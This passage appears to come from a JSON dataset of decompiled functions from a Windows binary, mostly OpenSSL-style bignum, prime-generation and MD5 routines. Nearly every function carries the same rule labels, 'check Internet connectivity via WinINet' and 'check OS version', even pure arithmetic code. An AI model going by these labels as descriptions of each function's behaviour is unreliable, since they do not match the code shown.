((~uVar5 | uVar3) ^ uVar7) + piVar8[-8], 0xf);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0x4e0811a1 + ((~uVar7 | uVar4) ^ uVar3) + piVar8[-1], 0x15);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xf7537e82 + ((~uVar3 | uVar5) ^ uVar4) + piVar8[-10], 6);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xbd3af235 + ((~uVar4 | uVar7) ^ uVar5) + piVar8[-3], 10);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0x2ad7d2bb + ((~uVar5 | uVar3) ^ uVar7) + piVar8[-0xc], 0xf);\n            uVar4 = iVar2 + uVar3;\n            iVar6 = sub.msvcrt.dll__lrotl(uVar5 + 0xeb86d391 + ((~uVar7 | uVar4) ^ uVar3) + piVar8[-5], 0x15);\n            piVar1[2] = piVar1[2] + uVar4;\n            *piVar1 = *piVar1 + uVar7;\n            iVar2 = *piVar1;\n            piVar1[1] = piVar1[1] + iVar6 + uVar4;\n            arg_8h = piVar1[1];\n            var_4h = piVar1[2];\n            piVar1[3] = piVar1[3] + uVar3;\n            var_8h = piVar1[3];\n            piVar8 = piVar8 + 0x10;\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 4514
    },
    "2002571d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2002571d(uint arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t arg_18h;\n    uint uVar3;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = fcn.200241e7();\n    if ((var_8h != 0) && (var_4h = fcn.20025cb8(),  var_4h != 0)) {\n        fcn.20025c2c(var_4h);\n        iVar2 = fcn.20025c4b(var_4h);\n        arg_18h = fcn.20025c4b(var_4h);\n        if ((iVar2 != 0) && (arg_18h != 0)) {\n            if (arg_ch == 2) {\n                fcn.20024717(iVar2, 0x18);\n                fcn.20024717(arg_18h, 0xb);\n            }\n            else if (arg_ch == 5) {\n                fcn.20024717(iVar2, 10);\n                fcn.20024717(arg_18h, 3);\n            }\n            iVar2 = fcn.20027057(0, arg_8h, 1, iVar2, arg_18h, arg_10h, arg_14h);\n            if (iVar2 != 0) {\n                if (arg_10h != NULL) {\n                    (*arg_10h)(3, 0, arg_14h);\n                }\n                *(var_8h + 8) = iVar2;\n                uVar3 = fcn.20024546();\n                *(var_8h + 0xc) = uVar3;\n                iVar2 = fcn.20024717(uVar3, arg_ch);\n                if (iVar2 != 0) {\n                    bVar1 = true;\n                    goto code_r0x20025800;\n                }\n            }\n        }\n    }\n    bVar1 = false;\ncode_r0x20025800:\n    if (var_4h != 0) {\n        fcn.20025c80(var_4h);\n        fcn.20025bf9(var_4h);\n    }\n    if ((!bVar1) && (var_8h != 0)) {\n        fcn.20024102(var_8h);\n        var_8h = 0;\n    }\n    return var_8h;\n}\n",
        "token_count": 578
    },
    "200258a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200258a8(uint arg_8h, uint noname_1, code *arg_10h, code *arg_14h, int32_t *arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_110h;\n    uint var_10h;\n    uint ptr;\n    uint var_8h;\n    \n    piVar1 = arg_18h;\n    if (*arg_18h != 0) {\n        if (arg_18h[3] != 0) {\n            do {\n                arg_18h = 0x100;\n                iVar2 = (*arg_14h)(arg_8h, &var_110h, &arg_18h, piVar1[3] * 1000, 0);\n            } while (iVar2 == 0);\n        }\n        iVar2 = fcn.2002395a(piVar1 + 1, &var_10h);\n        if (iVar2 != 0) {\n            (*arg_10h)(arg_8h, ptr, var_8h, 0);\n            (*_sym.imp.msvcrt.dll_free)(ptr);\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "20025946": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20025946(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    if ((arg_8h != 0) && (iVar1 = fcn.20027396(arg_8h),  0 < iVar1)) {\n        do {\n            puVar2 = fcn.200273a5(arg_8h, iVar4);\n            if ((puVar2 != NULL) && (puVar2[3] != 0)) {\n                uVar3 = fcn.2002591b(arg_10h, iVar4);\n                (*puVar2[3])(arg_ch, uVar3, arg_10h, iVar4, *puVar2, puVar2[1]);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar1);\n    }\n    if (*arg_10h != 0) {\n        fcn.20027374(*arg_10h);\n        *arg_10h = 0;\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "200259b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200259b0(int32_t arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    *arg_10h = 0;\n    if ((arg_8h != 0) && (iVar1 = fcn.20027396(arg_8h),  0 < iVar1)) {\n        do {\n            puVar2 = fcn.200273a5(arg_8h, iVar4);\n            if ((puVar2 != NULL) && (puVar2[2] != 0)) {\n                uVar3 = fcn.2002591b(arg_10h, iVar4);\n                (*puVar2[2])(arg_ch, uVar3, arg_10h, iVar4, *puVar2, puVar2[1]);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar1);\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "20025a0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20025a0c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (param_1 != 0) {\n        param_1 = -1 - param_1;\n    }\n    if (((*0x2004715c != NULL) && (fcn.20025b2f(9, 0x1b, \"..\\\\libs\\\\ce\\\\openssl\\\\cryptlib.c\", 0xf8),  *0x20047144 != 0))\n       && (iVar1 = fcn.20027396(*0x20047144),  param_1 < iVar1)) {\n        piVar2 = fcn.200273a5(*0x20047144, param_1);\n        if (piVar2 != NULL) {\n            *piVar2 = *piVar2 + -1;\n            if (*piVar2 < 1) {\n                fcn.200273b9(*0x20047144, param_1, 0);\n            }\n            else {\n                piVar2 = NULL;\n            }\n        }\n        fcn.20025b2f(10, 0x1b, \"..\\\\libs\\\\ce\\\\openssl\\\\cryptlib.c\", 0x10f);\n        if (piVar2 != NULL) {\n            (**0x2004715c)(piVar2[1], \"..\\\\libs\\\\ce\\\\openssl\\\\cryptlib.c\", 0x113);\n            (*_sym.imp.msvcrt.dll_free)(piVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 344
    },
    "20025b2f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20025b2f(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_ch < 0) {\n        iVar1 = fcn.20025ab9(-1 - arg_ch);\n        if ((iVar1 != 0) && (*0x20047158 != NULL)) {\n            (**0x20047158)(arg_8h, iVar1, arg_10h, arg_14h);\n        }\n        fcn.20025a0c(-1 - arg_ch);\n    }\n    else if (*0x20047148 != NULL) {\n    // WARNING: Could not recover jumptable at 0x20025b77. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x20047148)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "20025c4b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.20025c4b(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if ((param_1[0x52] < 0xd) && (iVar1 = *param_1,  iVar1 < 0x10)) {\n        *param_1 = iVar1 + 1;\n        return param_1 + iVar1 * 5 + 1;\n    }\n    if (param_1[0x5f] == 0) {\n        param_1[0x5f] = 1;\n    }\n    return NULL;\n}\n",
        "token_count": 133
    },
    "20025c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20025c80(uint *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        piVar1 = param_1 + 0x52;\n        if (*piVar1 == 0) {\n            fcn.20025c2c(param_1);\n        }\n        param_1[0x5f] = 0;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0xc) {\n            *param_1 = param_1[*piVar1 + 0x53];\n        }\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "20025f63": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20025f63(int32_t *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_1ch;\n    int32_t var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.20024535(&var_1ch);\n    arg_8h_00 = arg_8h + 1;\n    fcn.2002466f(arg_8h + 6, arg_ch);\n    iVar1 = fcn.20024488(arg_ch);\n    *arg_8h = (iVar1 + 0x1f + (iVar1 + 0x1f >> 0x1f & 0x1fU) >> 5) << 5;\n    fcn.20024717(arg_8h_00, 0);\n    fcn.2002494e(arg_8h_00, 0x20);\n    var_8h = **arg_ch;\n    var_4h = 0;\n    var_30h = &var_8h;\n    var_24h = arg_ch[3];\n    var_2ch = 1;\n    var_28h = 2;\n    iVar1 = fcn.2002b81a(&var_1ch, arg_8h_00, &var_30h, arg_10h);\n    if (iVar1 != 0) {\n        fcn.2002b5f0(&var_1ch, &var_1ch, 0x20);\n        if ((var_18h == 0) || ((var_18h == 1 && (*var_1ch == 0)))) {\n            fcn.20024717(&var_1ch, 0xffffffff);\n        }\n        else {\n            fcn.2002b3bb(&var_1ch, 1);\n        }\n        fcn.2002af5f(&var_1ch, 0, &var_1ch, &var_30h, arg_10h);\n        arg_8h[0x10] = *var_1ch;\n        fcn.20024501(&var_1ch);\n        fcn.20024717(arg_8h_00, 0);\n        fcn.2002494e(arg_8h_00, *arg_8h * 2);\n        fcn.2002b2da(arg_8h_00, arg_8h_00, arg_8h + 6, arg_10h);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 625
    },
    "2002611a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.2002611a(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint8_t *arg_8h_00;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t in_ECX;\n    int32_t arg_ch_00;\n    uint32_t uVar4;\n    uint var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    if (in_ECX == 0) {\n        fcn.20024717(arg_ch);\n        return 1;\n    }\n    arg_ch_00 = in_ECX + 7 + (in_ECX + 7 >> 0x1f & 7U) >> 3;\n    uVar4 = in_ECX - 1U & 0x80000007;\n    if (uVar4 < 0) {\n        uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n    }\n    uVar3 = uVar4;\n    var_10h = 0xff << (uVar3 + 1 & 0x1f);\n    arg_8h_00 = (*_sym.imp.msvcrt.dll_calloc)(1, arg_ch_00);\n    if (arg_8h_00 == NULL) {\n        return var_ch;\n    }\n    (*_sym.imp.msvcrt.dll__time64)();\n    fcn.20025836(&var_18h, 8);\n    if (arg_8h == 0) {\n        iVar2 = fcn.20025857();\n        if (iVar2 < 1) goto code_r0x20026263;\n    }\n    else {\n        iVar2 = fcn.20025867();\n        if (iVar2 == -1) goto code_r0x20026263;\n    }\n    if ((arg_8h == 2) && (var_8h = 0,  0 < arg_ch_00)) {\n        do {\n            fcn.20025867();\n            if ((var_1h < 0x80) || (var_8h < 1)) {\n                if (var_1h < 0x2a) {\n                    arg_8h_00[var_8h] = 0;\n                }\n                else if (var_1h < 0x54) {\n                    arg_8h_00[var_8h] = 0xff;\n                }\n            }\n            else {\n                arg_8h_00[var_8h] = arg_8h_00[var_8h + -1];\n            }\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_ch_00);\n    }\n    if (arg_10h != -1) {\n        if (arg_10h == 0) {\n            cVar1 = '\\x01';\n        }\n        else {\n            if (uVar4 == 0) {\n                arg_8h_00[1] = arg_8h_00[1] | 0x80;\n                *arg_8h_00 = 1;\n                goto code_r0x20026239;\n            }\n            uVar3 = uVar3 - 1;\n            cVar1 = '\\x03';\n        }\n        *arg_8h_00 = *arg_8h_00 | cVar1 << (uVar3 & 0x1f);\n    }\ncode_r0x20026239:\n    *arg_8h_00 = *arg_8h_00 & ~var_10h;\n    if (arg_14h != 0) {\n        arg_8h_00[arg_ch_00 + -1] = arg_8h_00[arg_ch_00 + -1] | 1;\n    }\n    iVar2 = fcn.2002475a(arg_8h_00, arg_ch_00, arg_ch);\n    if (iVar2 != 0) {\n        var_ch = 1;\n    }\ncode_r0x20026263:\n    sub.ntdll.dll_memset(arg_8h_00, 0, arg_ch_00);\n    (*_sym.imp.msvcrt.dll_free)(arg_8h_00);\n    return var_ch;\n}\n",
        "token_count": 1004
    },
    "200262b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200262b4(uint arg_8h, int32_t **arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((arg_ch[3] == NULL) && (arg_ch[1] != NULL)) && ((arg_ch[1] != 0x1 || (**arg_ch != 0)))) {\n        iVar1 = fcn.20024488(arg_ch);\n        if (iVar1 == 1) {\n            iVar1 = fcn.20024717(arg_8h, 0);\n            if (iVar1 == 0) goto code_r0x200262f7;\n        }\n        else {\n            iVar3 = fcn.200249bf(arg_ch, iVar1 + -2);\n            if (iVar3 == 0) {\n                do {\n                    iVar3 = fcn.2002627e(arg_8h, iVar1 + 1, 0xffffffff, 0);\n                    if ((iVar3 == 0) ||\n                       ((iVar3 = fcn.200248c4(arg_8h, arg_ch),  -1 < iVar3 &&\n                        ((iVar3 = fcn.200275cc(arg_8h, arg_8h, arg_ch),  iVar3 == 0 ||\n                         ((iVar3 = fcn.200248c4(arg_8h, arg_ch),  -1 < iVar3 &&\n                          (iVar3 = fcn.200275cc(arg_8h, arg_8h, arg_ch),  iVar3 == 0)))))))) goto code_r0x200262f7;\n                    iVar3 = fcn.200248c4(arg_8h, arg_ch);\n                } while (-1 < iVar3);\n            }\n            else {\n                do {\n                    iVar3 = fcn.2002627e(arg_8h, iVar1, 0xffffffff, 0);\n                    if (iVar3 == 0) goto code_r0x200262f7;\n                    iVar3 = fcn.200248c4(arg_8h, arg_ch);\n                } while (-1 < iVar3);\n            }\n        }\n        uVar2 = 1;\n    }\n    else {\ncode_r0x200262f7:\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 503
    },
    "20026405": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20026405(uint arg_8h, uint *arg_ch, uint arg_10h, uint8_t **arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint arg_ch_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint arg_18h_00;\n    uint var_29ch;\n    uint var_288h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_18h = 0;\n    var_4h = 0;\n    if ((**arg_14h & 1) == 0) {\n        return 0;\n    }\n    iVar1 = fcn.20024488(arg_10h);\n    var_14h = iVar1;\n    if (iVar1 == 0) {\n        fcn.20024717(arg_8h, 1);\n        return 1;\n    }\n    fcn.20025c2c(arg_18h);\n    var_8h = fcn.20025c4b(arg_18h);\n    arg_8h_00 = fcn.20025c4b(arg_18h);\n    if ((var_8h == 0) || (arg_8h_00 == 0)) {\ncode_r0x200266fe:\n        if (arg_1ch != 0) goto code_r0x20026713;\n    }\n    else {\n        if (arg_1ch != 0) {\n            var_4h = arg_1ch;\ncode_r0x200264b2:\n            fcn.20024535(&var_29ch);\n            iVar6 = 1;\n            var_18h = 1;\n            iVar2 = fcn.20024882(arg_ch, arg_14h);\n            if (-1 < iVar2) {\n                iVar2 = fcn.2002b2da(&var_29ch, arg_ch, arg_14h, arg_18h);\n                if (iVar2 == 0) goto code_r0x200266fe;\n                arg_ch = &var_29ch;\n            }\n            var_10h = var_4h + 4;\n            iVar2 = fcn.2002607e(&var_29ch, arg_ch, var_10h, var_4h, arg_18h);\n            if (iVar2 == 0) goto code_r0x200266fe;\n            if (iVar1 < 0x2a0) {\n                if (0xef < iVar1) {\n                    var_ch = 5;\n                    goto code_r0x20026566;\n                }\n                if (0x4f < iVar1) {\n                    var_ch = 4;\n                    goto code_r0x20026566;\n                }\n                var_ch = (0x17 < iVar1) * 2 + 1;\n                iVar2 = var_18h;\n                if (1 < var_ch) goto code_r0x20026566;\n            }\n            else {\n                var_ch = 6;\ncode_r0x20026566:\n                iVar1 = fcn.2002607e(var_8h, &var_29ch, &var_29ch, var_4h, arg_18h);\n                if (iVar1 == 0) goto code_r0x200266fe;\n                iVar3 = 1 << (var_ch - 1U & 0x1f);\n                iVar1 = var_14h;\n                iVar2 = iVar6;\n                if (1 < iVar3) {\n                    puVar5 = &var_288h;\n                    do {\n                        fcn.20024535(puVar5);\n                        iVar1 = fcn.2002607e(puVar5, puVar5 + -5, var_8h, var_4h, arg_18h);\n                        if (iVar1 == 0) goto code_r0x200266fe;\n                        iVar6 = iVar6 + 1;\n                        puVar5 = puVar5 + 5;\n                        iVar1 = var_14h;\n                        iVar2 = iVar6;\n                    } while (iVar6 < iVar3);\n                }\n            }\n            var_18h = iVar2;\n            var_8h = iVar1 + -1;\n            var_14h = 1;\n            uVar4 = var_10h;\n            iVar1 = var_4h;\n            arg_18h_00 = arg_18h;\n            arg_ch_00 = fcn.20024438();\n            iVar1 = fcn.2002607e(arg_8h_00, arg_ch_00, uVar4, iVar1, arg_18h_00);\n            if (iVar1 != 0) {\n                do {\n                    while( true ) {\n                        iVar1 = var_8h;\n                        uVar4 = 1;\n                        iVar2 = fcn.200249bf(arg_10h, var_8h);\n                        if (iVar2 != 0) break;\n                        if ((var_14h == 0) &&\n                           (iVar2 = fcn.2002607e(arg_8h_00, arg_8h_00, arg_8h_00, var_4h, arg_18h),  iVar2 == 0))\n                        goto code_r0x200266fe;\n                        if (iVar1 == 0) goto code_r0x200266e3;\n                        var_8h = iVar1 + -1;\n                    }\n                    var_10h = 0;\n                    uVar7 = uVar4;\n                    if (1 < var_ch) {\n                        do {\n                            iVar1 = iVar1 + -1;\n                            if (iVar1 < 0) break;\n                            iVar2 = fcn.200249bf(arg_10h, iVar1);\n                            if (iVar2 != 0) {\n                                uVar4 = uVar4 << (uVar7 - var_10h & 0x1fU) | 1;\n                                var_10h = uVar7;\n                            }\n                            uVar7 = uVar7 + 1;\n                        } while (uVar7 < var_ch);\n                    }\n                    iVar1 = 0;\n                    iVar2 = var_10h + 1;\n                    if ((var_14h == 0) && (0 < iVar2)) {\n                        do {\n                            iVar6 = fcn.2002607e(arg_8h_00, arg_8h_00, arg_8h_00, var_4h, arg_18h);\n                            if (iVar6 == 0) goto code_r0x200266fe;\n                            iVar1 = iVar1 + 1;\n                        } while (iVar1 < iVar2);\n                    }\n                    iVar1 = fcn.2002607e(arg_8h_00, arg_8h_00, &var_29ch + (uVar4 >> 1) * 5, var_4h, arg_18h);\n                    if (iVar1 == 0) goto code_r0x200266fe;\n                    var_14h = 0;\n                    var_8h = var_8h + (-1 - var_10h);\n                } while (-1 < var_8h);\ncode_r0x200266e3:\n                iVar1 = fcn.20025ce5(arg_8h, arg_8h_00, var_4h, arg_18h);\n                if (iVar1 != 0) {\n                    var_1ch = 1;\n                }\n            }\n            goto code_r0x200266fe;\n        }\n        var_4h = fcn.200260f3();\n        if (var_4h == 0) goto code_r0x20026713;\n        iVar2 = fcn.20025f63(var_4h, arg_14h, arg_18h);\n        if (iVar2 != 0) goto code_r0x200264b2;\n    }\n    if (var_4h != 0) {\n        fcn.20025f2c(var_4h);\n    }\ncode_r0x20026713:\n    fcn.20025c80(arg_18h);\n    if (0 < var_18h) {\n        puVar5 = &var_29ch;\n        iVar1 = var_18h;\n        do {\n            fcn.200244ae(puVar5);\n            puVar5 = puVar5 + 5;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return var_1ch;\n}\n",
        "token_count": 1970
    },
    "2002673e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002673e(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint8_t **arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = 0;\n    if ((**arg_14h & 1) == 0) {\n        return 0;\n    }\n    iVar2 = fcn.20024488(arg_10h);\n    if (iVar2 == 0) {\n        fcn.20024717(arg_8h, 1);\n        return 1;\n    }\n    fcn.20025c2c(arg_18h);\n    iVar3 = fcn.20025c4b(arg_18h);\n    iVar4 = fcn.20025c4b(arg_18h);\n    iVar5 = fcn.20025c4b(arg_18h);\n    if (((iVar3 == 0) || (iVar4 == 0)) || (iVar5 == 0)) goto code_r0x2002698c;\n    if (arg_1ch == 0) {\n        var_4h = fcn.200260f3();\n        if (var_4h == 0) goto code_r0x200269a1;\n        iVar3 = fcn.20025f63(var_4h, arg_14h, arg_18h);\n        if (iVar3 != 0) goto code_r0x200267f5;\n    }\n    else {\n        var_4h = arg_1ch;\ncode_r0x200267f5:\n        bVar1 = true;\n        uVar6 = arg_ch;\n        for (iVar2 = iVar2 + -2; var_8h = iVar4,  -1 < iVar2; iVar2 = iVar2 + -1) {\n            uVar7 = uVar6 * uVar6;\n            iVar3 = var_8h;\n            if (uVar7 / uVar6 != uVar6) {\n                if (bVar1) {\n                    iVar4 = fcn.20024717();\n                    if ((iVar4 == 0) || (iVar4 = fcn.2002607e(var_8h, var_8h, var_4h + 4, var_4h, arg_18h),  iVar4 == 0)\n                       ) goto code_r0x2002698c;\n                    bVar1 = false;\n                    var_8h = iVar5;\n                }\n                else {\n                    iVar4 = fcn.2002b444(var_8h, uVar6);\n                    if ((iVar4 == 0) ||\n                       (iVar4 = fcn.2002b2da(iVar5, var_8h, arg_14h, arg_18h),  iVar3 = iVar5,  iVar4 == 0))\n                    goto code_r0x2002698c;\n                }\n                uVar7 = 1;\n                iVar5 = var_8h;\n            }\n            var_8h = iVar5;\n            if ((!bVar1) && (iVar5 = fcn.2002607e(iVar3, iVar3, iVar3, var_4h, arg_18h),  iVar5 == 0))\n            goto code_r0x2002698c;\n            iVar5 = fcn.200249bf(arg_10h, iVar2);\n            uVar6 = uVar7;\n            iVar4 = iVar3;\n            if ((iVar5 != 0) && (uVar6 = uVar7 * arg_ch,  (uVar7 * arg_ch) / arg_ch != uVar7)) {\n                if (bVar1) {\n                    iVar5 = fcn.20024717();\n                    if ((iVar5 == 0) || (iVar5 = fcn.2002607e(iVar3, iVar3, var_4h + 4, var_4h, arg_18h),  iVar5 == 0))\n                    goto code_r0x2002698c;\n                    bVar1 = false;\n                    uVar6 = arg_ch;\n                }\n                else {\n                    iVar5 = fcn.2002b444(iVar3, uVar7);\n                    if ((iVar5 == 0) ||\n                       (iVar5 = fcn.2002b2da(var_8h, iVar3, arg_14h, arg_18h),  uVar6 = arg_ch,  iVar4 = var_8h, \n                       var_8h = iVar3,  iVar5 == 0)) goto code_r0x2002698c;\n                }\n            }\n            iVar5 = var_8h;\n        }\n        if (uVar6 == 1) {\n            if (bVar1) {\n                iVar2 = fcn.20024717(arg_8h, 1);\n            }\n            else {\ncode_r0x2002696f:\n                iVar2 = fcn.20025ce5(arg_8h, var_8h, var_4h, arg_18h);\n            }\n            if (iVar2 != 0) {\n                var_14h = 1;\n            }\n        }\n        else if (bVar1) {\n            iVar2 = fcn.20024717();\n            if (iVar2 != 0) {\n                iVar2 = fcn.2002607e(var_8h, var_8h, var_4h + 4, var_4h, arg_18h);\njoined_r0x200269d2:\n                if (iVar2 != 0) goto code_r0x2002696f;\n            }\n        }\n        else {\n            iVar2 = fcn.2002b444(var_8h, uVar6);\n            if (iVar2 != 0) {\n                iVar2 = fcn.2002b2da(iVar5, var_8h, arg_14h, arg_18h);\n                var_8h = iVar5;\n                goto joined_r0x200269d2;\n            }\n        }\ncode_r0x2002698c:\n        if (arg_1ch != 0) goto code_r0x200269a1;\n    }\n    if (var_4h != 0) {\n        fcn.20025f2c(var_4h);\n    }\ncode_r0x200269a1:\n    fcn.20025c80(arg_18h);\n    return var_14h;\n}\n",
        "token_count": 1501
    },
    "20026a5d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.20026a5d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    uint var_1ffch;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    sub.ntdll.dll__chkstk();\n    uStack16 = 1;\n    uStack20 = 1;\n    uStack24 = arg_ch;\n    uStack28 = arg_8h;\n    uStack32 = 0x20026a7b;\n    iVar1 = fcn.2002627e();\n    do {\n        if (iVar1 == 0) {\n            return false;\n        }\n        iVar1 = 0;\n        do {\n            uStack16 = *(iVar1 + 0x2003040c);\n            uStack20 = arg_8h;\n            uStack24 = 0x20026a97;\n            uVar2 = fcn.2002b2f5();\n            *(&fcn.20026a5d::var_1ffch + iVar1) = uVar2;\n            iVar1 = iVar1 + 4;\n        } while (iVar1 < 0x1ffc);\n        uStack16 = 0;\n        do {\n            iVar1 = 0;\n            while( true ) {\n                if (0x1ffb < iVar1) {\n                    uStack20 = arg_8h;\n                    uStack24 = 0x20026af5;\n                    iVar1 = 